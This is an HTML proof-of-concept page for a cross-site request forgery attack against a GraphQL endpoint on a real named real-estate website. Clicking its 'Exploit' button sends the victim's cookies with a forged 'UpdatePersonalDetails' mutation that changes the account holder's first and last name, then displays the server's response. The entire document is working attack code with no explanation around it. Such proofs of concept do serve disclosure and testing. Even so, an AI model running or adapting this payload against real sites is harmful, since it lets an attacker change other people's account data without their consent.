<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>CSRF PoC - GraphQL JSON</title>
</head>
<body>
  <h3>CSRF PoC (GraphQL JSON) - Manual Submit</h3>
  <button onclick="exploit()">Exploit</button>

  <pre id="result"></pre>

  <script>
    function exploit() {
      const url = "https://mexa.realestate.com.au/graphql";
      const payload = {
        operationName: "UpdatePersonalDetails",
        query: `mutation UpdatePersonalDetails($input: personalDetailsInput!) {
          updatePersonalDetails(input: $input) {
            firstName
            lastName
            __typename
          }
        }`,
        variables: {
          input: { firstName: "admin", lastName: "nalla" }
        }
      };

      fetch(url, {
        method: "POST",
        credentials: "include",   // send victim's cookies
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      })
      .then(r => r.text())
      .then(text => {
        document.getElementById("result").textContent =
          "Exploit sent.\nResponse:\n" + text;
      })
      .catch(err => {
        document.getElementById("result").textContent =
          "Error: " + err;
      });
    }
  </script>
</body>
</html>
